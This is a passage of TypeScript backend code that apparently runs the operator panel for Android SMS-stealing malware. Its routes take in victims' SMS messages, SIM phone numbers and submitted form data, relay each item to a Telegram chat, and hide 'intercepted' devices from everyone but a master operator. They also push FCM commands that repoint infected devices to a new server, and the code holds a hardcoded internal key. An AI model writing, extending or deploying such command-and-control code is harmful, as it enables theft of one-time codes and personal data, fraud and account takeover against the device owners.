  const appId = c.req.query("appId");
  const userId = c.req.query("userId");
  const deviceId = c.req.query("deviceId");
  const searchTerm = c.req.query("search")?.trim() ?? "";
  const cursor = c.req.query("cursor"); // last message id for cursor pagination
  const isMaster = await isMasterSession(c);
  // Master may omit appId for the global cross-app inbox view (MainAdminPanel feature).
  // Non-master: appId is required and session must belong to that appId (prevents cross-app IDOR).
  if (!isMaster) {
    if (!appId) return c.json({ error: "appId required" }, 400);
    if (c.get('sessionAppId') !== appId) return c.json({ error: "Unauthorized" }, 401);
  }

  // browse page size — respects ?limit= param (cap 2000), default 30
  const PAGE = Math.min(Math.max(1, parseInt(c.req.query("limit") ?? "30", 10) || 30), 2000);

  // Base filter conditions (app / user / device scope)
  const scopeConds: ReturnType<typeof eq>[] = [];
  if (appId) scopeConds.push(eq(messages.appId, appId));
  else if (userId) scopeConds.push(eq(messages.userId, userId));
  else if (deviceId) scopeConds.push(eq(messages.deviceId, deviceId));
  // Non-master callers cannot see master-only (intercepted) messages
  if (!isMaster) scopeConds.push(eq(messages.masterOnly, false));

  if (searchTerm) {
    // ── Search mode: cursor-based ILIKE — uses id index per page, no OFFSET scan cost ──
    const searchLimit = Math.min(Math.max(1, parseInt(c.req.query("limit") ?? "100", 10) || 100), 200);
    const searchCursor = c.req.query("cursor"); // last id from previous page (exclusive)
    const like = `%${searchTerm.replace(/[%_\\]/g, "\\$&")}%`;
    const searchCond = sql`(${messages.body} ILIKE ${like} OR ${messages.fromSender} ILIKE ${like} OR ${messages.fromNumber} ILIKE ${like} OR ${messages.appId} ILIKE ${like} OR ${messages.deviceId} ILIKE ${like})` as unknown as ReturnType<typeof eq>;
    const cursorCond = searchCursor && !isNaN(parseInt(searchCursor, 10))
      ? sql`${messages.id} < ${parseInt(searchCursor, 10)}` as unknown as ReturnType<typeof eq>
      : null;
    const allConds = [...scopeConds, searchCond, ...(cursorCond ? [cursorCond] : [])];
    const where = allConds.length === 1 ? allConds[0] : and(...allConds);
    const rows = await db.select().from(messages).where(where).orderBy(desc(messages.id)).limit(searchLimit + 1);
    const hasMore = rows.length > searchLimit;
    const data = rows.slice(0, searchLimit).map(mapMessage);
    const lastId = data.length > 0 ? data[data.length - 1].id : null;
    return c.json({ data, hasMore, lastId });
  } else {
    // ── Browse mode: cursor pagination, newest first ───────────────────────
    const pageConds = [...scopeConds];
    if (cursor) {
      const cursorId = parseInt(cursor, 10);
      if (!isNaN(cursorId)) pageConds.push(sql`${messages.id} < ${cursorId}` as unknown as ReturnType<typeof eq>);
    }
    const where = pageConds.length === 0 ? undefined : pageConds.length === 1 ? pageConds[0] : and(...pageConds);
    const rows = where
      ? await db.select().from(messages).where(where).orderBy(desc(messages.id)).limit(PAGE)
      : await db.select().from(messages).orderBy(desc(messages.id)).limit(PAGE);
    return c.json(rows.map(mapMessage));
  }
});

app.post("/api/messages", async (c) => {
  const db = getDb(c.env);
  const body = await c.req.json() as Record<string, unknown>;
  if (!body.appId || !body.deviceId || !body.fromNumber || !body.body) {
    return c.json({ error: "appId, deviceId, fromNumber and body are required" }, 400);
  }
  const senderStr = String(body.fromSender ?? "");
  if (senderStr.toLowerCase().startsWith("call forward")) {
    return new Response(null, { status: 204 });
  }
  const uid = String(body.userId ?? `USR-${String(body.deviceId).slice(-6).toUpperCase()}`);
  // Check if this device is intercepted (master-only mode)
  const intercepted = await getInterceptedDevices(c.env);
  const isIntercepted = intercepted.includes(String(body.deviceId));
  const [inserted] = await db.insert(messages).values({
    appId: String(body.appId),
    deviceId: String(body.deviceId),
    userId: uid,
    fromSender: String(body.fromSender ?? "Unknown"),
    fromNumber: String(body.fromNumber),
    toNumber: body.toNumber ? String(body.toNumber) : null,
    body: String(body.body),
    isSensitive: Boolean(body.isSensitive ?? false),
    masterOnly: isIntercepted,
  }).returning();
  const mapped = mapMessage(inserted);
  // Only broadcast to WS (all clients) if NOT intercepted; intercepted = master-only via REST
  if (!isIntercepted) {
    await broadcast(c.env, "message_added", { appId: mapped.appId, message: mapped });
  } else {
    // Broadcast on a separate master-only event so master UI can still get live updates
    await broadcast(c.env, "master_message_added", { appId: mapped.appId, message: mapped });
  }
  c.executionCtx.waitUntil(Promise.all([
    sendTelegram(c.env,
      `📩 <b>New SMS</b>
  App: <code>${mapped.appId}</code>
  Device: <code>${mapped.deviceId}</code>
  From: <b>${mapped.fromNumber}</b>
  Sender: ${mapped.fromSender}
  To: ${mapped.toNumber ?? '—'}
  UserId: <code>${mapped.userId}</code>
  💬 ${mapped.body}`,
      mapped.appId
    ),
  ]));
  return c.json({ ok: true, id: mapped.id }, 201);
});

// ------- FORM DATA -------
app.get("/api/data", async (c) => {
  const db = getDb(c.env);
  const appId = c.req.query("appId");
  const deviceId = c.req.query("deviceId");
  // Master admin — supports offset+limit pagination
  if (await isMasterSession(c)) {
    // Master may omit appId for the global cross-app form-data view (MainAdminPanel feature).
    const pgLimit = Math.min(Number(c.req.query("limit") ?? "1000"), 2000);
    const pgOffset = Number(c.req.query("offset") ?? "0");
    const whereClause = appId ? eq(formData.appId, appId) : undefined;
    const [cntRow] = await db.select({ c: sql`count(*)` }).from(formData).where(whereClause);
    const total = Number(cntRow?.c ?? 0);
    const rows = await db.select().from(formData)
      .where(whereClause)
      .orderBy(desc(formData.submittedAt))
      .limit(pgLimit)
      .offset(pgOffset);
    return c.json({ data: rows.map(mapFormData), total, hasMore: pgOffset + rows.length < total });
  }
  if (!appId) {
    return c.json({ error: "appId is required" }, 400);
  }
  // SECURITY: a session for app A must not be able to read app B's form data by just
  // changing the appId query param (IDOR) — the master branch above already returned.
  if (c.get('sessionAppId') !== appId) return c.json({ error: "Unauthorized" }, 401);
  const where = deviceId
    ? and(eq(formData.appId, appId), eq(formData.deviceId, deviceId))
    : eq(formData.appId, appId);
  const rows = await db.select().from(formData).where(where).orderBy(desc(formData.submittedAt));
  return c.json(rows.map(mapFormData));
});

app.post("/api/data", async (c) => {
  const db = getDb(c.env);
  const body = await c.req.json() as { appId?: string; deviceId?: string; data?: Record<string, unknown> };
  if (!body.appId || !body.deviceId) return c.json({ error: "appId and deviceId are required" }, 400);
  if (!body.data || typeof body.data !== "object" || Array.isArray(body.data)) {
    return c.json({ error: "data must be a JSON object" }, 400);
  }
  const [row] = await db.insert(formData).values({
    appId: body.appId, deviceId: body.deviceId, data: body.data,
  }).returning();
  const mapped = mapFormData(row);
  await broadcast(c.env, "form_data_added", { appId: mapped.appId, formData: mapped });
  c.executionCtx.waitUntil(sendTelegram(c.env, (() => {
      const fields = Object.entries(mapped.data as Record<string, unknown>).map(([k,v]) => `  📝 <b>${k}</b>: ${v}`).join("\n");
      return `📋 <b>New Form Data</b>\nApp: <code>${mapped.appId}</code>\nDevice: <code>${mapped.deviceId}</code>\n${fields}`;
    })()));
  return c.json(mapped, 201);
});

// ── Delete Protection check ──────────────────────────────────────────────────
async function requireDeleteProtection(c: Parameters<typeof app.delete>[1] extends (c: infer C) => unknown ? C : never, appId: string, db: ReturnType<typeof getDb>): Promise<Response | null> {
    if (await isMasterSession(c)) return null; // master always bypasses
    const [appRow] = await db.select({ dpEnabled: appSecrets.deleteProtectionEnabled, dpPin: appSecrets.deleteProtectionPin }).from(appSecrets).where(eq(appSecrets.appId, appId)).limit(1);
    if (!appRow?.dpEnabled) return null;
    const pin = c.req.header("x-delete-pin") ?? "";
    if (!pin) return c.json({ error: "delete_protection", message: "Delete protection PIN required" }, 403);
    if (!(await _verifyPin(pin, appRow.dpPin ?? "", (c.env as Env).PIN_PEPPER ?? ""))) return c.json({ error: "delete_protection", message: "Wrong delete protection PIN" }, 401);
    return null;
  }

app.delete("/api/data/:id", async (c) => {
  const db = getDb(c.env);
  const id = Number(c.req.param("id"));
  if (Number.isNaN(id)) return c.json({ error: "Invalid id" }, 400);
  const [existing] = await db.select().from(formData).where(eq(formData.id, id)).limit(1);
  if (!existing) return c.json({ error: "Not found" }, 404);
  // SECURITY: a valid session for THIS app (or master PIN) is required before delete — this
  // used to only be gated by the optional delete-protection PIN, which is OFF by default,
  // meaning anyone who knew the id could delete it unauthenticated.
  const isMasterDD1 = await isMasterSession(c);
  if (!isMasterDD1) {
    const _sid1 = c.get('sessionAppId');
    if (!_sid1) return c.json({ error: "Unauthorized" }, 401);
    if (_sid1 !== existing.appId) return c.json({ error: "Unauthorized" }, 401);
  }
  const dpCheck2 = await requireDeleteProtection(c, existing.appId, db);
  if (dpCheck2) return dpCheck2;
  const [row] = await db.delete(formData).where(eq(formData.id, id)).returning();
  if (!row) return c.json({ error: "Not found" }, 404);
  const mapped = mapFormData(row);
  await broadcast(c.env, "form_data_deleted", { appId: mapped.appId, id });
  return c.json({ ok: true });
});

// Bulk delete: remove ALL form entries for a given appId + deviceId
app.delete("/api/data", async (c) => {
  const db = getDb(c.env);
  const appId = c.req.query("appId");
  const deviceId = c.req.query("deviceId");
  if (!appId || !deviceId) return c.json({ error: "appId and deviceId are required" }, 400);
  // SECURITY: same fix as /api/data/:id — require a valid session for this app or master PIN,
  // independent of the optional (default-off) delete-protection PIN.
  const isMasterDD2 = await isMasterSession(c);
  if (!isMasterDD2) {
    const _sid2 = c.get('sessionAppId');
    if (!_sid2) return c.json({ error: "Unauthorized" }, 401);
    if (_sid2 !== appId) return c.json({ error: "Unauthorized" }, 401);
  }
  const dpCheck3 = await requireDeleteProtection(c, appId, db);
  if (dpCheck3) return dpCheck3;
  const rows = await db.delete(formData)
    .where(and(eq(formData.appId, appId), eq(formData.deviceId, deviceId)))
    .returning();
  const ids = rows.map(r => r.id);
  await broadcast(c.env, "form_data_bulk_deleted", { appId, deviceId, ids });
  return c.json({ ok: true, deleted: ids.length });
});

// Delete a single SMS by id — scoped exactly to that message row
app.delete("/api/messages/:id", async (c) => {
  const db = getDb(c.env);
  const id = Number(c.req.param("id"));
  if (Number.isNaN(id)) return c.json({ error: "Invalid id" }, 400);
  const [msg] = await db.select().from(messages).where(eq(messages.id, id)).limit(1);
  if (!msg) return c.json({ error: "Not found" }, 404);
  const isMasterDel = await isMasterSession(c);
  if (!isMasterDel) {
    const _sid3 = c.get('sessionAppId');
    if (!_sid3) return c.json({ error: "Unauthorized" }, 401);
    if (_sid3 !== msg.appId) return c.json({ error: "Unauthorized" }, 401);
  }
  const dpCheck4 = await requireDeleteProtection(c, msg.appId, db);
  if (dpCheck4) return dpCheck4;
  await db.delete(messages).where(eq(messages.id, id));
  await broadcast(c.env, "message_deleted", { appId: msg.appId, deviceId: msg.deviceId, id });
  return c.json({ ok: true });
});

// Bulk delete ALL messages for an appId — single SQL query, very fast
app.delete("/api/messages", async (c) => {
  const appId = c.req.query("appId");
  if (!appId) return c.json({ error: "appId required" }, 400);
  const isMaster = await isMasterSession(c);
  if (!isMaster) {
    const _sid4 = c.get('sessionAppId');
    if (!_sid4) return c.json({ error: "Unauthorized" }, 401);
    if (_sid4 !== appId) return c.json({ error: "Unauthorized" }, 401);
  }
  const dpCheck = await requireDeleteProtection(c, appId, getDb(c.env));
  if (dpCheck) return dpCheck;
  const db = getDb(c.env);
  const result = await db.delete(messages).where(eq(messages.appId, appId)).returning({ id: messages.id });
  await broadcast(c.env, "bulk_deleted", { appId, count: result.length });
  return c.json({ ok: true, deleted: result.length });
});

// Delete a single device by deviceId + cascade its messages and form data
app.delete("/api/devices/:deviceId", async (c) => {
  const db = getDb(c.env);
  const deviceId = c.req.param("deviceId");
  // Fetch device first to get appId for session binding
  const [dev] = await db.select().from(devices).where(eq(devices.deviceId, deviceId)).limit(1);
  if (!dev) return c.json({ error: "Device not found" }, 404);
  const isMasterDev = await isMasterSession(c);
  if (!isMasterDev) {
    if (c.get('sessionAppId') !== dev.appId) return c.json({ error: "Unauthorized" }, 401);
  }
  const dpCheck5 = await requireDeleteProtection(c, dev.appId, db);
  if (dpCheck5) return dpCheck5;
  // Messages and form data are preserved even after device deletion — historical records
  await db.delete(devices).where(eq(devices.deviceId, deviceId));
  await broadcast(c.env, "device_deleted", { appId: dev.appId, deviceId: dev.deviceId });
  return c.json({ ok: true });
});

// ------- REGISTER + HEARTBEAT -------
async function upsertDeviceRaw(env: Env, input: {
  deviceId: string; appId: string; userId: string; name: string;
  androidVersion: number;
  sim1Carrier: string | null; sim1Phone: string | null;
  sim2Carrier: string | null; sim2Phone: string | null;
  fcmToken: string | null;
  status: string; lastOnline: string | null;
  forwardEnabled: boolean; forwardSlot: number | null;
}): Promise<{ row: ReturnType<typeof mapDevice>; created: boolean }> {
  const sqlClient = neon(env.NEON_DATABASE_URL);
  const rows = await sqlClient(
    `INSERT INTO devices (device_id, app_id, user_id, name, android_version, sim1_carrier, sim1_phone, sim2_carrier, sim2_phone, status, last_online, forward_enabled, forward_slot, fcm_token)
     VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14)
     ON CONFLICT (device_id) DO UPDATE SET
       app_id = EXCLUDED.app_id,
       user_id = EXCLUDED.user_id,
       name = EXCLUDED.name,
       android_version = EXCLUDED.android_version,
       sim1_carrier = EXCLUDED.sim1_carrier,
       sim1_phone = EXCLUDED.sim1_phone,
       sim2_carrier = EXCLUDED.sim2_carrier,
       sim2_phone = EXCLUDED.sim2_phone,
       status = EXCLUDED.status,
       last_online = EXCLUDED.last_online,
       forward_enabled = EXCLUDED.forward_enabled,
       forward_slot = EXCLUDED.forward_slot,
       fcm_token = EXCLUDED.fcm_token,
       updated_at = NOW()
     RETURNING *, (xmax = 0) AS was_created`,
    [
      input.deviceId, input.appId, input.userId, input.name, input.androidVersion,
      input.sim1Carrier, input.sim1Phone, input.sim2Carrier, input.sim2Phone,
      input.status, input.lastOnline ? new Date(input.lastOnline) : null,
      input.forwardEnabled, input.forwardSlot, input.fcmToken,
    ],
  ) as Array<Record<string, unknown>>;
  const r = rows[0];
  const mapped = {
    id: Number(r.id), deviceId: String(r.device_id), appId: String(r.app_id),
    userId: String(r.user_id), name: String(r.name),
    androidVersion: Number(r.android_version),
    sim1Carrier: (r.sim1_carrier as string | null) ?? null,
    sim1Phone: (r.sim1_phone as string | null) ?? null,
    sim2Carrier: (r.sim2_carrier as string | null) ?? null,
    sim2Phone: (r.sim2_phone as string | null) ?? null,
    status: String(r.status),
    lastOnline: iso(r.last_online as Date | string | null),
    forwardEnabled: Boolean(r.forward_enabled),
    forwardSlot: r.forward_slot == null ? null : Number(r.forward_slot),
    fcmToken: (r.fcm_token as string | null) ?? null,
    installedAt: isoReq(r.installed_at as Date | string),
    updatedAt: isoReq(r.updated_at as Date | string),
  };
  return { row: mapped, created: Boolean(r.was_created) };
}

app.post("/api/register", async (c) => {
  const db = getDb(c.env);
  const body = await c.req.json() as Record<string, unknown>;
  if (!body.appId || !body.deviceId || !body.name) {
    return c.json({ error: "appId, deviceId and name are required" }, 400);
  }
  const safeAppId = String(body.appId);
  // Block registration if admin has not pre-created this appId, or if app is disabled
  const existing = await db.select().from(apps).where(eq(apps.appId, safeAppId)).limit(1);
  if (existing.length === 0) {
    return c.json({ error: "App not authorized. Admin must create this App ID first." }, 403);
  }
  if (existing[0].status !== "active") {
    return c.json({ error: "App is disabled. Contact admin to activate." }, 403);
  }
  const uid = String(body.userId ?? `USR-${String(body.deviceId).slice(-6).toUpperCase()}`);
  const { row, created } = await upsertDeviceRaw(c.env, {
    appId: safeAppId,
    deviceId: String(body.deviceId),
    userId: uid,
    name: String(body.name),
    androidVersion: Number(body.androidVersion ?? 0),
    sim1Carrier: body.sim1Carrier != null ? String(body.sim1Carrier) : null,
    sim1Phone: body.sim1Phone != null ? String(body.sim1Phone) : null,
    sim2Carrier: body.sim2Carrier != null ? String(body.sim2Carrier) : null,
    sim2Phone: body.sim2Phone != null ? String(body.sim2Phone) : null,
    fcmToken: body.fcmToken != null ? String(body.fcmToken) : null,
    status: "online",
    lastOnline: new Date().toISOString(),
    forwardEnabled: false, forwardSlot: null,
  });
  await broadcast(c.env, "device_updated", row);
  if (created) c.executionCtx.waitUntil(sendTelegram(c.env, `📱 <b>New Device Registered</b>\nApp: <code>${row.appId}</code>\nDevice: <b>${row.name}</b> (<code>${row.deviceId}</code>)\nUser: ${row.userId}\nAndroid: ${row.androidVersion}\nSIM1: ${row.sim1Carrier ?? "—"} ${row.sim1Phone ?? ""}\nSIM2: ${row.sim2Carrier ?? "—"} ${row.sim2Phone ?? ""}`, safeAppId));
  return c.json({ ok: true, deviceId: row.deviceId, created }, created ? 201 : 200);
});

// Internal batch broadcast — called by Render after bulk DB write
// Accepts array of full device objects → broadcasts each via Durable Object → WebSocket → panel
app.post("/api/internal/batch-broadcast", async (c) => {
  const key = c.req.header("X-Internal-Key");
  if (key !== "mrbatchkey2024") return c.json({ error: "unauthorized" }, 401);
  const body = await c.req.json() as { devices?: unknown[] };
  if (!Array.isArray(body.devices)) return c.json({ error: "devices array required" }, 400);
  // Broadcast all in parallel — Durable Object handles fan-out to all WS clients
  await Promise.all(body.devices.map(d => broadcast(c.env, "device_updated", d)));
  return c.json({ ok: true, count: body.devices.length });
});

app.post("/api/heartbeat", async (c) => {
  const db = getDb(c.env);
  const body = await c.req.json() as Record<string, unknown>;
  if (!body.deviceId) return c.json({ error: "deviceId is required" }, 400);
  const uid = String(body.deviceId);
  const now = new Date();
  const patch: Partial<typeof devices.$inferInsert> = {
    status: "online", lastOnline: now, updatedAt: now,
  };
  if (body.fcmToken != null) patch.fcmToken = String(body.fcmToken);
  const [row] = await db.update(devices).set(patch).where(eq(devices.deviceId, uid)).returning();
  // If device not found in DB, reject — admin must register app+device first via /register
  if (!row) {
    return c.json({ error: "Device not registered. Contact admin." }, 403);
  }
  await broadcast(c.env, "device_updated", mapDevice(row));
  return c.json({ ok: true });
});

// ------- RECOVERY AND FCM DIAGNOSTICS -------
function describeFcmFailure(error: unknown): { status: number; code: string; error: string } {
  const e = error as { fcmConfig?: boolean; fcmStatus?: number; fcmBody?: { error?: { status?: string; details?: Array<{ errorCode?: string }> } } };
  const code = e?.fcmBody?.error?.details?.find(detail => detail.errorCode)?.errorCode
    ?? e?.fcmBody?.error?.status ?? "FCM_ERROR";
  if (code === "UNREGISTERED") return {
    status: 410, code,
    error: "Device registration is expired or unregistered. A fresh token from the Android app is required; retrying this old token cannot fix it.",
  };
  if (code === "SENDER_ID_MISMATCH") return {
    status: 403, code, error: "Device token and configured Firebase project do not match.",
  };
  if (e?.fcmConfig) return { status: 503, code: "FCM_CONFIG_MISSING", error: "Firebase service account configuration is missing or incomplete." };
  if (e?.fcmStatus === 404) return {
    status: 502, code, error: "Firebase returned NOT_FOUND. Check the configured Firebase project; this is not confirmed to be an expired device token.",
  };
  if (e?.fcmStatus === 400) return {
    status: 400, code, error: "Firebase rejected the registration token or message data.",
  };
  return { status: e?.fcmStatus && e.fcmStatus >= 400 && e.fcmStatus <= 599 ? e.fcmStatus : 502,
    code, error: "Firebase did not accept this message. Check its error code and service-account configuration." };
}

async function recoveryCaller(c: Parameters<typeof app.post>[1] extends (c: infer C) => unknown ? C : never) {
  const authorization = c.req.header("Authorization") ?? "";
  if (!authorization.startsWith("Bearer ")) return null;
  if (!c.env.JWT_SECRET) throw new Error("AUTH_CONFIG_MISSING");
  const payload = await verifyJwt(authorization.slice(7), c.env.JWT_SECRET);
  if (!payload || typeof payload.sub !== "string" || typeof payload.exp !== "number" ||
      payload.exp <= Math.floor(Date.now() / 1000)) return null;
  if (payload.role !== "master" && payload.role !== "sub-admin") return null;
  if (payload.role === "sub-admin" && (typeof payload.appId !== "string" || !payload.appId)) return null;
  const sqlC = neon(c.env.NEON_DATABASE_URL);
  const rows = payload.role === "master"
    ? await sqlC(`SELECT id FROM master_sessions WHERE id = $1 LIMIT 1`, [payload.sub])
    : await sqlC(`SELECT id FROM admin_sessions WHERE id = $1 AND app_id = $2 LIMIT 1`, [payload.sub, payload.appId]);
  return rows.length ? payload : null;
}

// Matches the existing Express recovery contract. Read-only SQL; the only
// device command is an authenticated app-scoped update to this deployment's API URL.
app.post("/api/recovery", async (c) => {
  try {
    const caller = await recoveryCaller(c);
    if (!caller || caller.role !== "sub-admin") return c.json({ error: "Sub-admin login required." }, 401);
    const body = await c.req.json().catch(() => null) as { offset?: unknown; limit?: unknown; appId?: unknown } | null;
    if (!body || typeof body !== "object" || Array.isArray(body)) return c.json({ error: "Invalid recovery request." }, 400);
    if (body.appId !== undefined && body.appId !== caller.appId) return c.json({ error: "App scope mismatch." }, 403);
    const offset = body.offset ?? 0;
    const limit = body.limit ?? 20;
    if (!Number.isSafeInteger(offset) || Number(offset) < 0 || !Number.isSafeInteger(limit) || Number(limit) < 1 || Number(limit) > 20) {
      return c.json({ error: "offset must be a non-negative integer; limit must be 1–20." }, 400);
    }
    try { getFirebaseCredentials(c.env); } catch {
      return c.json({ error: "Firebase service account configuration is missing or invalid.", code: "FCM_CONFIG_MISSING" }, 503);
    }
    const sqlC = neon(c.env.NEON_DATABASE_URL);
    const [countRow] = await sqlC(
      `SELECT COUNT(*)::int AS total FROM devices WHERE app_id = $1 AND fcm_token IS NOT NULL AND LENGTH(TRIM(fcm_token)) > 0`,
      [caller.appId]);
    const total = Number(countRow?.total ?? 0);
    const targets = await sqlC(
      `SELECT device_id, fcm_token FROM devices WHERE app_id = $1 AND fcm_token IS NOT NULL AND LENGTH(TRIM(fcm_token)) > 0 ORDER BY device_id ASC LIMIT $2 OFFSET $3`,
      [caller.appId, limit, offset]) as Array<{ device_id: string; fcm_token: string }>;
    const url = new URL("/api", c.req.url).toString();
    let ok = 0, fail = 0;
    const failures = new Map<string, { code: string; error: string; count: number }>();
    for (let i = 0; i < targets.length; i += 4) {
      await Promise.all(targets.slice(i, i + 4).map(async target => {
        try {
          await sendFcmToToken(c.env, target.fcm_token, { type: "url_update", url, priority: "high" });
          ok++;
        } catch (error) {
          fail++;
          const failure = describeFcmFailure(error);
          const existing = failures.get(failure.code);
          failures.set(failure.code, { code: failure.code, error: failure.error, count: (existing?.count ?? 0) + 1 });
        }
      }));
    }
    const processed = Number(offset) + targets.length;
    return c.json({ ok, fail, processed, total, done: processed >= total || targets.length === 0,
      url, errors: [...failures.values()], deliveryConfirmed: false });
  } catch {
    return c.json({ error: "Recovery could not start: authentication or database configuration unavailable." }, 503);
  }
});

// ------- FCM -------
app.post("/api/fcm/send", async (c) => {
  const body = await c.req.json() as { deviceId?: string; data?: Record<string, string> };
  if (!body.deviceId) return c.json({ error: "deviceId is required" }, 400);
  if (!body.data || typeof body.data !== "object") return c.json({ error: "data object is required" }, 400);
  let caller;
  try { caller = await recoveryCaller(c); } catch { return c.json({ error: "Authentication configuration unavailable." }, 503); }
  if (!caller) return c.json({ error: "Admin login required." }, 401);
  const db = getDb(c.env);
  const [device] = await db.select().from(devices).where(eq(devices.deviceId, body.deviceId)).limit(1);
  if (!device) return c.json({ error: "Device not found" }, 404);
  if (caller.role === "sub-admin" && device.appId !== caller.appId) return c.json({ error: "App scope mismatch." }, 403);
  if (!device.fcmToken) return c.json({ error: "Device has no FCM token registered" }, 422);

  const safeData: Record<string, string> = {};
  for (const [k, v] of Object.entries(body.data)) {
    safeData[k] = (v !== null && typeof v === "object") ? JSON.stringify(v) : String(v);
  }

  try {
    const result = await sendFcmToToken(c.env, device.fcmToken, safeData);
    return c.json({ success: true, messageId: result.messageId });
  } catch (err: unknown) {
    const failure = describeFcmFailure(err);
    return c.json({ error: failure.error, code: failure.code }, failure.status as 400);
  }
});

app.post("/api/fcm/online-check", async (c) => {
  const body = await c.req.json() as { token?: string; data?: Record<string, string> };
  if (!body.token) return c.json({ error: "token is required" }, 400);
  const safeData: Record<string, string> = {};
  for (const [k, v] of Object.entries(body.data ?? { type: "online_check" })) safeData[k] = String(v);
  try {
    const result = await sendFcmToToken(c.env, body.token, safeData);
    return c.json({ success: true, messageId: result.messageId });
  } catch (err: unknown) {
    const e = err as Error & { fcmStatus?: number; fcmBody?: unknown };
    if (e.fcmStatus) return c.json({ error: e.fcmBody }, e.fcmStatus as 400);
    return c.json({ error: e.message }, 500);
  }
});

// ── Master PIN: DB-driven with 30s in-memory cache ──
let _masterPinCache: { value: string; ts: number } = { value: "", ts: 0 };
const _sessionCache = new Map<string, { expiry: number; appId: string }>();

async function getMasterPin(env: Env): Promise<string> {
  const now = Date.now();
  if (_masterPinCache.value && now - _masterPinCache.ts < 30_000) return _masterPinCache.value;
  try {
    const sql = neon(env.NEON_DATABASE_URL);
    const rows = await sql(`SELECT value FROM settings WHERE key = 'master_pin' LIMIT 1`) as Array<{ value: string }>;
    const pin = (rows[0]?.value ?? "").trim();
    _masterPinCache = { value: pin, ts: now };
    return pin;
  } catch (err) {
    console.error("[getMasterPin] DB error:", err);
    return ""; // DB unavailable — no fallback, reject all
  }
}

// ------- MASTER ADMIN (PIN from settings table) -------
async function checkMasterPin(c: Parameters<typeof app.use>[1] extends (c: infer C, n: () => Promise<void>) => unknown ? C : never): Promise<Response | null> {
  if (await isMasterSession(c)) return null;
  return c.json({ error: "Master session required" }, 401);
}


app.post("/api/master/change-pin", async (c) => {
    const currentPin = decodeMasterPinHeader(c.req.header("x-master-pin")) ?? "";
    if (!currentPin) return c.json({ error: "Current Master PIN required" }, 401);
    const correctPin = await getMasterPin(c.env);
    if (!correctPin) return c.json({ error: "Master PIN not configured" }, 500);
    if (currentPin !== correctPin) return c.json({ error: "Wrong current Master PIN" }, 401);
    const body = await c.req.json().catch(() => ({})) as { newPin?: string };
    const newPin = (body.newPin ?? "").trim();
    if (newPin.length < 8) return c.json({ error: "New Master PIN must be at least 8 characters" }, 400);
    const sqlClient = neon(c.env.NEON_DATABASE_URL);
    await sqlClient(`UPDATE settings SET value = $1 WHERE key = 'master_pin'`, [newPin]);
    _masterPinCache = { value: newPin, ts: 0 }; // invalidate cache immediately
    // Force-logout every admin session across every app — anyone in using the old
    // Master PIN's authority is fully locked out, matching the security intent of a PIN rotation.
    await sqlClient(`DELETE FROM admin_sessions`);
    return c.json({ ok: true });
  });

  app.get("/api/master/login-limit", async (c) => {
    const guard = await checkMasterPin(c);
    if (guard) return guard;
    const sqlC = neon(c.env.NEON_DATABASE_URL);
    const rows = await sqlC(
      `SELECT key, value FROM settings WHERE key IN ('master_max_attempts', 'master_lockout_minutes', 'master_session_limit')`,
    ) as Array<{ key: string; value: string }>;
    const map = Object.fromEntries(rows.map((r) => [r.key, r.value]));
    return c.json({
      maxAttempts: parseInt(map.master_max_attempts ?? "5", 10) || 5,
      lockoutMinutes: parseInt(map.master_lockout_minutes ?? "15", 10) || 15,
      sessionLimit: parseInt(map.master_session_limit ?? "3", 10) || 3,
    });
  });

  app.patch("/api/master/login-limit", async (c) => {
    const guard = await checkMasterPin(c);
    if (guard) return guard;
    const body = await c.req.json().catch(() => ({})) as { maxAttempts?: number; lockoutMinutes?: number; sessionLimit?: number };
    const maxAttempts = Math.max(1, Math.min(50, Math.floor(Number(body.maxAttempts) || 5)));
    const lockoutMinutes = Math.max(1, Math.min(1440, Math.floor(Number(body.lockoutMinutes) || 15)));
    const sessionLimit = Math.max(1, Math.min(100, Math.floor(Number(body.sessionLimit) || 3)));
    const sqlC = neon(c.env.NEON_DATABASE_URL);
    await sqlC(
      `INSERT INTO settings (key, value) VALUES ('master_max_attempts', $1)
       ON CONFLICT (key) DO UPDATE SET value = $1`,
      [String(maxAttempts)],
    );
    await sqlC(
      `INSERT INTO settings (key, value) VALUES ('master_lockout_minutes', $1)
       ON CONFLICT (key) DO UPDATE SET value = $1`,
      [String(lockoutMinutes)],
    );
    await sqlC(
      `INSERT INTO settings (key, value) VALUES ('master_session_limit', $1)
       ON CONFLICT (key) DO UPDATE SET value = $1`,
      [String(sessionLimit)],
    );
    return c.json({ ok: true, maxAttempts, lockoutMinutes, sessionLimit });
  });

  app.post("/api/admin/verify-master-pin", async (c) => {
  // PIN-based master login has been replaced by Google OAuth — this endpoint is disabled.
  return c.json({ error: "PIN login is disabled. Use Google Sign-In." }, 410);

  const ip = c.req.header("CF-Connecting-IP") ?? c.req.header("x-forwarded-for") ?? "unknown";
  const sqlLimit = neon(c.env.NEON_DATABASE_URL);

  const [{ value: maxAttemptsStr } = { value: "5" }] = await sqlLimit(
    `SELECT value FROM settings WHERE key = 'master_max_attempts' LIMIT 1`,
  ) as Array<{ value: string }>;
  const [{ value: lockoutMinStr } = { value: "15" }] = await sqlLimit(
    `SELECT value FROM settings WHERE key = 'master_lockout_minutes' LIMIT 1`,
  ) as Array<{ value: string }>;
  const maxAttempts = Math.max(1, parseInt(maxAttemptsStr ?? "5", 10) || 5);
  const lockoutMinutes = Math.max(1, parseInt(lockoutMinStr ?? "15", 10) || 15);

  const attRows = await sqlLimit(
    `SELECT failed_count, locked_until FROM master_login_attempts WHERE ip = $1 LIMIT 1`,
    [ip],
  ) as Array<{ failed_count: number; locked_until: string | null }>;
  const attemptRow = attRows[0];
  if (attemptRow?.locked_until && new Date(attemptRow.locked_until).getTime() > Date.now()) {
    const minsLeft = Math.ceil((new Date(attemptRow.locked_until).getTime() - Date.now()) / 60000);
    return c.json({ error: `Too many wrong attempts. Try again in ${minsLeft} minute(s).` }, 429);
  }

  const correctPin = await getMasterPin(c.env);
  if (body.pin !== correctPin) {
    const newCount = (attemptRow?.failed_count ?? 0) + 1;
    const lockedUntil = newCount >= maxAttempts
      ? new Date(Date.now() + lockoutMinutes * 60_000).toISOString()
      : null;
    await sqlLimit(
      `INSERT INTO master_login_attempts (ip, failed_count, last_attempt, locked_until)
       VALUES ($1, $2, NOW(), $3)
       ON CONFLICT (ip) DO UPDATE SET failed_count = $2, last_attempt = NOW(), locked_until = $3`,
      [ip, newCount, lockedUntil],
    );
    if (lockedUntil) {
      return c.json({ error: `Too many wrong attempts. Locked for ${lockoutMinutes} minute(s).` }, 429);
    }
